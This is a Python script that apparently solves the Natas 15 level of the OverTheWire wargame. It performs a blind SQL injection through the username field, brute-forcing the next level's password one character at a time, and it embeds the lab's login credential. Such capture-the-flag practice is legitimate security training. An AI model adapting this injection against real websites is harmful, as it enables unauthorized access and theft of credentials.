import requests

response = ""
username_template = 'natas16" and password = "{password}'

url = "http://natas15.natas.labs.overthewire.org/index.php"
characters_list = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'
old_password = ""

while True:
	found = False
	for char in characters_list:
		password = old_password + char + '%'
		response = str(requests.post(url, data = {'username': 'natas16" and password LIKE BINARY "{}'.format(password)}, auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')).content)
		if "This user exists" in response:
			found = True
			old_password = password[:-1]
			print(old_password)
			break

	if not found:
		print('password: {}'.format(old_password))
		break


